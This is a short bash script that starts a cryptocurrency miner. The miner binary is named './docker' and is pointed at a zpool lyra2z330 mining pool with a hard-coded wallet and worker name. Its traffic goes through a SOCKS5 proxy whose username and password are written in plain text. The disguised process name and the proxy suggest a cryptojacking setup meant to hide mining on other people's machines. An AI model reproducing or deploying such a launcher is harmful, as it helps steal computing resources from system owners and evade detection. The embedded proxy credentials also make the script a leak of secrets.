#!/bin/bash
POOL=stratum+tcp://lyra2z330.na.mine.zpool.ca:4563
WALLET=DHPDYmFtCZUCRoqWEL4XhrkwLXCcLzvZTY
WORKER=TXT11
PROXY=socks5://serda67jui19:shiban716liop1z@185.199.228.220:7300
./docker -a lyra2z330 -o $POOL -u $WALLET.$WORKER -p c=DGB,zap=BUTK-lyra/GXX -t2 -x $PROXY
